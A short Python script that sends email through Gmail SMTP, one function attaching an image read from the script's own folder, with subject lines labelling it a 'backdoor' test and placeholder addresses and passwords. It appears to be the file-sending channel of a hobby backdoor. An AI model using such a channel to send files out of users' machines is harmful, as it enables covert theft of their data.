import os
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
# Author: dropnfly23

########
from_addr    = 'testmailer123123123@gmail.com'
to_addr_list = ['testmailer123123123@gmail.com']
cc_addr_list = ['testmailer123123123@gmail.com']
subject      = 'bckdoor py'
message      = 'this is my mailsender test'
login        = 'emailadresse@gmail.com'
password     = 'passwordemail'
smtpserver='smtp.gmail.com:587'

######



def sendemail(from_addr, to_addr_list, cc_addr_list,
              subject, message,
              login, password,
              smtpserver='smtp.gmail.com:587'):
    header  = 'From: %s\n' % from_addr
    header += 'To: %s\n' % ','.join(to_addr_list)
    header += 'Cc: %s\n' % ','.join(cc_addr_list)
    header += 'Subject: %s\n\n' % subject
    message = header + message

    try:
        server = smtplib.SMTP(smtpserver) #can throw an exception
    except smtplib.socket.gaierror:
        return False
    server.starttls()
        ## Login
    try:
       server.login(login, password)
    except smtplib.SMTPAuthenticationError:
        server.quit()
        return False
        #server.login(login,password)
    try:
        server.sendmail(from_addr, to_addr_list, message)
        return True
    except Exception: # try to avoid catching Exception unless you have too
        return False
    finally:
        server.quit()

dir_path = os.path.dirname(os.path.realpath(__file__))


# sendemail(from_addr    = 'testmailer123123123@gmail.com',
#           to_addr_list = ['testmailer123123123@gmail.com'],
#           cc_addr_list = ['testmailer123123123@gmail.com'],
#           subject      = 'bckdoor py',
#           message      = 'this is my mailsender test' +dir_path,
#           login        = 'email@gmail.com',
#           password     = 'password')


def function_send_mail():
    img_data = open(dir_path + '/ImgFileName.jpg', 'rb').read()
    msg = MIMEMultipart()
    msg['Subject'] = 'bckdoorpython'
    msg['From'] = 'email@gmail.com'
    msg['To'] = 'emaildest@gmail.com'

    text = MIMEText("this is a test email")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename('ImgFileName.jpg'))
    msg.attach(image)
    try:
        server = smtplib.SMTP(smtpserver)  # can throw an exception
    except smtplib.socket.gaierror:
        print('smtplib.socket.gaierror')
    server.starttls()
    ## Login
    try:
        server.login(login, password)
    except smtplib.SMTPAuthenticationError:
        server.quit()
        print('smtplib.SMTPAuthenticationError')
        # server.login(login,password)
    try:
        server.sendmail(from_addr, to_addr_list, msg.as_string())
    except Exception:  # try to avoid catching Exception unless you have too
        print('Error')
    finally:
        server.quit()


